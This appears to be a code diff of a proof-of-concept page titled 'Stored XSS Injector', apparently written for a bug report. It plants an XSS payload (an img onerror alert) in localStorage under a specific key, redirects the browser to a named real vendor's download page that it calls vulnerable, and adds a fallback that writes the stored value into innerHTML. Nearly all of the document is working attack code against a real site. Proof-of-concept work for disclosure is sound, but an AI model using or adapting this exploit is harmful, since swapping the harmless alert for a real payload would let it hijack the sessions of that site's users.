@@ -1,11 +1,30 @@
-<script>
-localStorage.setItem("ad333bae-5a0f-4221-9821-0399fb113a42-download", `<img src="x" onerror="alert('Stored XSS')">`);
-location.href = "https://www.ucweb.com/download/android";
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Stored XSS Injector</title>
+    <meta charset="UTF-8" />
+  </head>
+  <body>
+    <h2>Setting up Stored XSS... Please wait</h2>
+    <script>
+      // Step 1: Set malicious payload in localStorage
+      localStorage.setItem(
+        "ad333bae-5a0f-4221-9821-0399fb113a42-download",
+        `<img src="x" onerror="alert('Stored XSS by Neha')">`
+      );
 
-// fallback for demo purposes
-setTimeout(() => {
-  try {
-    document.getElementById('root').innerHTML = localStorage.getItem("ad333bae-5a0f-4221-9821-0399fb113a42-download");
-  } catch(e) {}
-}, 3000);
-</script>
+      // Step 2: Redirect to vulnerable page
+      location.href = "https://www.ucweb.com/download/android";
+
+      // Optional fallback (in case page allows JS injection again)
+      setTimeout(() => {
+        try {
+          document.getElementById("root").innerHTML =
+            localStorage.getItem("ad333bae-5a0f-4221-9821-0399fb113a42-download");
+        } catch (e) {
+          console.warn("Manual injection failed", e);
+        }
+      }, 3000);
+    </script>
+  </body>
+</html>
